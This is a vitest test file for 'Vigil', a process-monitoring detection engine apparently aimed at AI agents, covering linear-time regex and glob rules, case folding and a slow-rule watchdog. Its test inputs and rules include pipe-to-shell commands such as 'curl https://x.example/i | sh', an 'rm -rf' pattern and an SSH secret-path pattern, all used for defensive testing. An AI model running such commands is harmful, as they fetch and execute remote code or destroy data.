import { afterEach, describe, expect, it, vi } from 'vitest';
import { compileAgentMatchers } from '../agents/match.js';
import { AgentRegistry } from '../agents/registry.js';
import { compileRule, DetectionEngine, RuleCompileError, SLOW_RULE_BUDGET_MS } from '../engine.js';
import { builtinRulesFor } from '../packs/agent-preflight.js';
import { SECRET_PATH_SSH } from '../packs/agent-watch.js';
import { globProblem, MAX_SUBJECT_LENGTH, regexProblem } from '../rules/compile.js';
import { foldCase, linearEngine, linearProblem } from '../rules/linear.js';
import { lintRule } from '../rules/lint.js';
import { isShippedPattern } from '../rules/trusted.js';
import { userOrigin } from '../user.js';
import { SafetyFloor } from '../safety.js';
import { MemoryAgentStore, memoryStores } from '../state/stores.js';
import { DetectionRule } from '../types.js';
import { exec, proc, testRule } from './fixtures.js';

// Known-bad patterns, joined at run time so code scanning doesn't mistake
// these test inputs for regexes the app runs.
const bad = (...parts: string[]) => parts.join('');

const onCommandLine = (value: string, nocase?: boolean) =>
  testRule({
    id: 'r-own',
    condition: {
      field: 'process.commandLine',
      op: 'regex',
      value,
      ...(nocase === undefined ? {} : { nocase }),
    },
  });

const run = (args: string[]) => exec(proc({ path: '/bin/sh', pid: 700, args }));

describe('linear-time engine', () => {
  it('is available in this runtime (node, as the helper ships it)', () => {
    expect(linearEngine()).toBe(true);
  });

  it('runs a regex Vigil does not ship in linear time, even one past the shape checks', () => {
    // Several stars on one letter pass regexProblem but backtrack polynomially.
    const pattern = bad('a*'.repeat(6), 'b');
    expect(regexProblem(pattern)).toBeUndefined();
    const eng = new DetectionEngine([onCommandLine(pattern)], memoryStores());
    const t0 = performance.now();
    expect(eng.evaluate(run(['a'.repeat(MAX_SUBJECT_LENGTH)]))).toEqual([]);
    expect(performance.now() - t0).toBeLessThan(250);
    expect(eng.evaluate(run(['aab']))).toHaveLength(1);
  });

  it('refuses what the linear-time engine cannot run, with the reason', () => {
    expect(() => compileRule(onCommandLine('curl(?=\\s)'))).toThrow(RuleCompileError);
    expect(() => compileRule(onCommandLine('curl(?=\\s)'))).toThrow(/linear-time.*lookahead/);
    expect(() => compileRule(onCommandLine('[0-9a-f]{40}'))).toThrow(/up to 16/);
    const lint = lintRule(DetectionRule.parse(onCommandLine('curl(?!\\s)')));
    expect(lint.errors.join()).toMatch(/lookahead/);
    // A lookbehind is fine.
    expect(() => compileRule(onCommandLine('(?<!-)rm -rf'))).not.toThrow();
  });

  it('matches a case-insensitive regex exactly as the i flag would', () => {
    const eng = new DetectionEngine([onCommandLine('CURL .*\\|\\s*sh', true)], memoryStores());
    expect(eng.evaluate(run(['curl https://x.example/i | sh']))).toHaveLength(1);
    expect(eng.evaluate(run(['Curl https://x.example/i |SH']))).toHaveLength(1);
    expect(eng.evaluate(run(['wget https://x.example/i | sh']))).toEqual([]);
  });

  it('runs an own glob in linear time, case-insensitive by default', () => {
    const rule = testRule({
      id: 'r-glob',
      condition: { field: 'process.path', op: 'glob', value: '/Users/*/Downloads/**' },
    });
    expect(compileRule(rule).untrusted).toBe(true);
    const eng = new DetectionEngine([rule], memoryStores());
    const at = (path: string) => eng.evaluate(exec(proc({ path, pid: 701 }))).length;
    expect(at('/Users/alex/downloads/x/evil')).toBe(1);
    expect(at('/Users/alex/Documents/evil')).toBe(0);
    const many = testRule({
      id: 'r-glob2',
      condition: { field: 'process.path', op: 'glob', value: `/tmp/*${'?'.repeat(17)}` },
    });
    expect(() => compileRule(many)).toThrow(/more than 16/);
  });
});

describe('foldCase', () => {
  const patterns = [
    'abc',
    'Straße',
    '[a-f]+x',
    '[^a-z]+',
    '[0-Z]',
    '[a-]',
    '[\\w-]+',
    '[\\d-z]',
    '\\x41b\\u0063',
    '(?<Name>foo)bar',
    'k\\k',
    '\\bfoo\\B',
    'a{2}b{1,3}',
    'x{y}',
    'σ+',
    '[ά-ώ]',
    'K\\p',
    '[\\b]',
    '\\cJ',
    'é|É',
  ];
  const subjects = [
    'ABC',
    'abc',
    'STRASSE',
    'straße',
    'STRAßE',
    'FFx',
    '0aZ',
    '_',
    'A-',
    'ABC',
    'nameFOOBAR',
    'Kk',
    'FOO',
    'AABBB',
    'X{Y}',
    'ΣΣς',
    'Ά',
    'kP',
    '\b',
    '\n',
    'É',
    '\u212a',
    '\u017f',
  ];
  it('matches without i exactly what the pattern matches with it', () => {
    for (const p of patterns) {
      const want = new RegExp(p, 'i');
      const folded = new RegExp(foldCase(p));
      for (const s of subjects) expect(folded.test(s), `${p} on ${s}`).toBe(want.test(s));
    }
  });
  it('agrees with the i flag on every character up to U+03FF, alone and in a class', () => {
    const chars = Array.from({ length: 0x400 }, (_, i) => String.fromCharCode(i));
    const subject = chars.join('');
    const wrong: string[] = [];
    for (const c of chars) {
      const esc = `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`;
      for (const p of [esc, `[${esc}]`, `[^${esc}]`]) {
        const want = subject.replace(new RegExp(p, 'gi'), '');
        if (subject.replace(new RegExp(foldCase(p), 'g'), '') !== want) wrong.push(p);
      }
    }
    expect(wrong).toEqual([]);
  });
  it('leaves a pattern with no letters as it is', () => {
    expect(foldCase('^[0-9]+\\.\\d*$')).toBe('^[0-9]+\\.\\d*$');
  });
  it('gives no linear problem for any pattern above', () => {
    for (const p of patterns) expect(linearProblem(p, true), p).toBeUndefined();
  });
});

describe('patterns Vigil ships', () => {
  it('keep the usual engine in every built-in rule, so they match as before', () => {
    for (const r of [...builtinRulesFor('darwin'), ...builtinRulesFor('linux')])
      expect(compileRule(r).untrusted, r.id).toBe(false);
  });
  it('count as shipped in your own rule too, by their text alone', () => {
    expect(isShippedPattern('regex', SECRET_PATH_SSH)).toBe(true);
    expect(compileRule(onCommandLine(SECRET_PATH_SSH)).untrusted).toBe(false);
    expect(isShippedPattern('regex', `${SECRET_PATH_SSH} `)).toBe(false);
  });
});

describe('slow rule watchdog', () => {
  afterEach(() => vi.restoreAllMocks());

  // Each condition test looks like it takes `ms`.
  const slowClock = (ms: number) => {
    let t = 0;
    let calls = 0;
    vi.spyOn(performance, 'now').mockImplementation(() => (calls++ % 2 ? (t += ms) : t));
  };

  it('reports a rule over its budget once, and keeps it on with its answers', () => {
    const slow: Array<[string, number]> = [];
    const rule = testRule({
      id: 'r-own',
      mode: 'block',
      condition: { field: 'process.commandLine', op: 'regex', value: 'curl .*\\| *sh' },
    });
    const eng = new DetectionEngine([rule], memoryStores(), {
      onSlowRule: (r, ms) => slow.push([r.id, ms]),
    });
    slowClock(SLOW_RULE_BUDGET_MS);
    expect(eng.evaluate(run(['ls']))).toEqual([]);
    expect(slow).toEqual([]);
    expect(eng.evaluate(run(['ls']))).toEqual([]);
    expect(slow.map(([id]) => id)).toEqual(['r-own']);
    // Still on, still blocking, still deciding in full.
    const [d] = eng.evaluate(run(['curl x | sh']));
    expect(d?.mode).toBe('block');
    expect(eng.modeOf(eng.getRule('r-own')!)).toBe('block');
    expect(eng.check(run(['ls']))).toEqual([]);
    expect(slow).toHaveLength(1);
    expect(eng.slowRules()).toEqual(['r-own']);
    // Changing the rule clears the flag.
    eng.upsertRule(rule);
    expect(eng.slowRules()).toEqual([]);
  });

  it('does not time rules whose patterns Vigil ships', () => {
    const slow: string[] = [];
    const eng = new DetectionEngine(builtinRulesFor('darwin'), memoryStores(), {
      onSlowRule: (r) => slow.push(r.id),
    });
    slowClock(SLOW_RULE_BUDGET_MS * 10);
    for (let i = 0; i < 3; i++) eng.evaluate(run(['ls', '-la']));
    expect(slow).toEqual([]);
  });

  it('a failing report changes nothing', () => {
    const eng = new DetectionEngine([onCommandLine('curl')], memoryStores(), {
      onSlowRule: () => {
        throw new Error('no');
      },
    });
    slowClock(SLOW_RULE_BUDGET_MS * 2);
    expect(eng.evaluate(run(['curl']))).toHaveLength(1);
  });
});

describe('other globs', () => {
  const tooSlow = bad('/opt/**', 'a**', 'b**', 'c');

  it('agent path globs that could take too long drop their matcher', () => {
    expect(globProblem(tooSlow)).toBeDefined();
    const m = compileAgentMatchers([
      {
        id: 'slow',
        name: 'Slow',
        kind: 'cli',
        match: [{ paths: [tooSlow] }, { names: ['slowagent'] }],
        watch: true,
        origin: 'user',
        status: 'active',
        createdAt: 0,
        updatedAt: 0,
      },
    ]);
    expect(m.match({ path: '/opt/xaybzc' })).toBeUndefined();
    expect(m.match({ path: '/usr/local/bin/slowagent' })?.id).toBe('slow');
  });

  it('the agent registry refuses them with the reason', () => {
    const reg = new AgentRegistry(new MemoryAgentStore(), []);
    expect(() =>
      reg.save(
        { id: 'slow', name: 'Slow', kind: 'cli', match: [{ paths: [tooSlow] }], watch: true },
        userOrigin('agents-screen'),
      ),
    ).toThrow(/can stop anywhere/);
  });

  it('protected path globs are checked too', () => {
    expect(() => new SafetyFloor({ protectedPathGlobs: [tooSlow] })).toThrow(/protectedPathGlobs/);
    expect(() => new SafetyFloor({ protectedPathGlobs: ['/opt/work/**'] })).not.toThrow();
  });
});
